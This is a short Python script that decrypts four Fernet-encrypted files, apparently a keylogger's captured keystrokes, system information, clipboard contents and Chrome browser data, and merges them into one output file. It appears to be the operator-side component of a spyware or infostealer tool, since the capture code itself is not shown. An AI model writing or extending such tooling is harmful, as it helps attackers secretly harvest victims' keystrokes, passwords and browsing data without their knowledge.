from cryptography.fernet import Fernet
from dotenv import load_dotenv
import os

load_dotenv()

key = os.getenv("ENCRYPTION_KEY")
base_path = os.getenv("LINUX_BASE_PATH")

keys_info_e = 'e_keys_log.txt'
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'
chrome_info_e = 'e_chrome_info.txt'

key_path = os.path.join(base_path, keys_info_e)
sys_path = os.path.join(base_path, system_info_e)
clip_path = os.path.join(base_path, clipboard_info_e)
chrome_path = os.path.join(base_path, chrome_info_e)

encrypted_files = [key_path, sys_path, clip_path, chrome_path]

output_file = os.path.join(base_path, "decryption.txt")

for file in encrypted_files:
    with open(file, 'rb') as f:
        data = f.read()
        f.close()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(output_file, 'ab') as f:
        f.write(decrypted)
        f.close()
